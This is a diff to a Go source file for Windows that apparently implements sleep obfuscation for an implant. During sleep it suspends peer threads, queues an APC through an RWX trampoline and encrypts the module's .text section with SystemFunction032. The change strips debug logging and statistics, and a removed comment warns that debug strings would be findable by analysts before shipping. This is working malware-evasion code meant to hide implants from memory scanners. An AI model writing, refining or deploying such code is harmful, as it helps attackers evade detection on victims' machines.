@@ -26,9 +26,7 @@ import (
 	"errors"
 	"fmt"
 	"runtime"
-	"sync/atomic"
 	"syscall"
-	"time"
 	"unsafe"
 
 	"golang.org/x/sys/windows"
@@ -53,10 +51,6 @@ const (
 	// Bound on ResumeThread drain iterations per peer. Typical is 1-2.
 	maxResumeDrain = 1024
 
-	// OutputDebugStringA logging. Set false before shipping — the format
-	// strings live in .rdata and are trivially findable with `strings`.
-	apcDebug = false
-
 	// Watchdog timeouts (ms). The suspend-phase margin scales with
 	// sleepMs; the resume phase is fixed.
 	watchdogMarginMinMs = 5000
@@ -78,7 +72,6 @@ var (
 	procQueueUserAPC          = kernel32.NewProc("QueueUserAPC")
 	procSuspendThread         = kernel32.NewProc("SuspendThread")
 	procResumeThread          = kernel32.NewProc("ResumeThread")
-	procOutputDebugStringA    = kernel32.NewProc("OutputDebugStringA")
 	procCreateTimerQueueTimer = kernel32.NewProc("CreateTimerQueueTimer")
 	procDeleteTimerQueueTimer = kernel32.NewProc("DeleteTimerQueueTimer")
 
@@ -90,31 +83,10 @@ var (
 	advapi32              = syscall.NewLazyDLL("Advapi32.dll")
 	procSystemFunction032 = advapi32.NewProc("SystemFunction032")
 
-	cyclesTotal atomic.Uint64
-	errorsTotal atomic.Uint64
-
 	// .text section bounds, resolved once at init and reused every cycle.
 	textSectionBase uintptr
 	textSectionSize uintptr
 )
-
-// Stats returns cumulative (cycles, errors) since process start.
-func Stats() (cycles, errors uint64) {
-	return cyclesTotal.Load(), errorsTotal.Load()
-}
-
-func dbg(format string, args ...any) {
-	if !apcDebug {
-		return
-	}
-	msg := fmt.Sprintf("[apc] "+format+"\n", args...)
-	p, err := windows.BytePtrFromString(msg)
-	if err != nil {
-		return
-	}
-	procOutputDebugStringA.Call(uintptr(unsafe.Pointer(p)))
-	runtime.KeepAlive(p)
-}
 
 // ustring is the SystemFunction032 argument descriptor
 // (ULONG Length, ULONG MaximumLength, PVOID Buffer).
@@ -266,7 +238,6 @@ func init() {
 	for _, p := range []*syscall.LazyProc{
 		procGetModuleHandleA, procVirtualAlloc, procVirtualFree,
 		procVirtualProtect, procQueueUserAPC, procSuspendThread, procResumeThread,
-		procOutputDebugStringA,
 		procCreateTimerQueueTimer, procDeleteTimerQueueTimer,
 		procNtDelayExecution, procNtWaitForSingleObject, procNtQueryInformationThread,
 		procSystemFunction032,
@@ -566,16 +537,12 @@ func Sleep(sleepMs uint64) error {
 	if sleepMs == 0 {
 		return nil
 	}
-	cycle := cyclesTotal.Add(1)
-	sleepStart := time.Now()
-	dbg("cycle=%d enter Sleep sleepMs=%d", cycle, sleepMs)
 
 	runtime.LockOSThread()
 	defer runtime.UnlockOSThread()
 
 	imageBase, _, _ := procGetModuleHandleA.Call(0)
 	if imageBase == 0 {
-		errorsTotal.Add(1)
 		return errors.New("apc: GetModuleHandleA returned NULL")
 	}
 	eLfaNew := *((*uint32)(unsafe.Pointer(imageBase + 0x3c)))
@@ -584,7 +551,6 @@ func Sleep(sleepMs uint64) error {
 
 	var keyBuf [16]byte
 	if _, err := rand.Read(keyBuf[:]); err != nil {
-		errorsTotal.Add(1)
 		return err
 	}
 
@@ -596,7 +562,6 @@ func Sleep(sleepMs uint64) error {
 		pageExecuteReadWrite,
 	)
 	if tramp == 0 {
-		errorsTotal.Add(1)
 		return errors.New("apc: VirtualAlloc for trampoline failed")
 	}
 	defer procVirtualFree.Call(tramp, 0, memRelease)
@@ -632,7 +597,6 @@ func Sleep(sleepMs uint64) error {
 		currentTID,
 	)
 	if err != nil {
-		errorsTotal.Add(1)
 		return err
 	}
 	defer windows.CloseHandle(hSelf)
@@ -648,7 +612,6 @@ func Sleep(sleepMs uint64) error {
 	wdTimeoutMs := watchdogTimeoutMs(sleepMs)
 	peers, err := suspendAndArmPeers(currentTID, imageBase, imageEnd, wdTimeoutMs)
 	if err != nil {
-		errorsTotal.Add(1)
 		return err
 	}
 
@@ -657,9 +620,7 @@ func Sleep(sleepMs uint64) error {
 	// the corresponding peer is running -- encrypting now would AV that
 	// peer on its next instruction fetch. Abort the cycle instead.
 	cancelWatchdogs(peers)
-	if allSuspended, badTID := verifyAllPeersSuspended(peers); !allSuspended {
-		dbg("cycle=%d watchdog fired during suspend (tid=%d) - aborting encryption", cycle, badTID)
-		errorsTotal.Add(1)
+	if allSuspended, _ := verifyAllPeersSuspended(peers); !allSuspended {
 		armResumeWatchdogs(peers)
 		resumeAndClose(peers)
 		return nil
@@ -675,7 +636,6 @@ func Sleep(sleepMs uint64) error {
 		uintptr(unsafe.Pointer(args)),
 	)
 	if ret == 0 {
-		errorsTotal.Add(1)
 		armResumeWatchdogs(peers)
 		resumeAndClose(peers)
 		return errors.New("apc: QueueUserAPC failed")
@@ -693,10 +653,6 @@ func Sleep(sleepMs uint64) error {
 	// Image is decrypted and .text is executable again; safe to resume peers.
 	armResumeWatchdogs(peers)
 	resumeAndClose(peers)
-
-	if elapsedMs := uint64(time.Since(sleepStart).Milliseconds()); elapsedMs > sleepMs+watchdogMarginMinMs {
-		dbg("cycle=%d watchdog likely rescued (elapsedMs=%d intendedMs=%d)", cycle, elapsedMs, sleepMs)
-	}
 
 	runtime.KeepAlive(keyBuf)
 	runtime.KeepAlive(args)
